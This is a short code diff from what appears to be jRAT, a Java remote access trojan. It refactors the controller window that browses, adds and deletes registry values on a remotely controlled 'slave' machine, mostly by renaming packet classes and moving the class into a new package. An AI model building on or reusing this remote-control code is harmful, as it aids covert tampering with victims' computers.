@@ -1,4 +1,4 @@
-package jrat.module.registry;
+package jrat.module.registry.ui;
 
 import com.redpois0n.pathtree.FolderTreeNode;
 import com.redpois0n.pathtree.NodeClickListener;
@@ -35,6 +35,9 @@ import javax.swing.JTextField;
 import javax.swing.JToolBar;
 import javax.swing.ScrollPaneConstants;
 import jrat.api.ui.DefaultJTable;
+import jrat.module.registry.PacketQuery;
+import jrat.module.registry.PacketAdd;
+import jrat.module.registry.PacketDelete;
 
 @SuppressWarnings( "serial" )
 public class FrameRemoteRegistry extends BaseFrame {
@@ -240,7 +243,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 	}
 
 	public void execute(String location) {
-		slave.addToSendQueue(new Packet79BrowseRegistry(location));
+		slave.addToSendQueue(new PacketQuery(location));
 	}
 
 	public void exit() {
@@ -273,7 +276,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		if (data == null) {
 			return;
 		}
-		slave.addToSendQueue(new Packet97RegistryAdd(txt.getText(), name, type, data));
+		slave.addToSendQueue(new PacketAdd(txt.getText(), name, type, data));
 		reload();
 	}
 
@@ -281,7 +284,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		int row = table.getSelectedRow();
 		if (row != -1) {
 			String val = table.getValueAt(row, 0).toString();
-			slave.addToSendQueue(new Packet99RegistryDelete(txt.getText(), val));
+			slave.addToSendQueue(new PacketDelete(txt.getText(), val));
 			reload();
 		}
 	}
@@ -296,7 +299,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 				return;
 			}
 
-			slave.addToSendQueue(new Packet97RegistryAdd(txt.getText(), val, type, data));
+			slave.addToSendQueue(new PacketAdd(txt.getText(), val, type, data));
 
 			reload();
 		}
